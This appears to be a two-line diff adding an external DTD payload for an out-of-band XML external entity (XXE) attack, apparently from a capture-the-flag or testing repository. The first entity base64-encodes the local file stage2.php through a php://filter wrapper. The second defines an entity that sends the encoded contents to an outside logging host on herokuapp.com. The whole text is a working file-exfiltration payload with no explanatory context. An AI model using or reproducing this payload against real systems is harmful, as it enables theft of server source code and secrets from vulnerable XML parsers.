@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=./stage2.php" >
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://logger-itsafe.herokuapp.com/?file=%file;'>">%all;
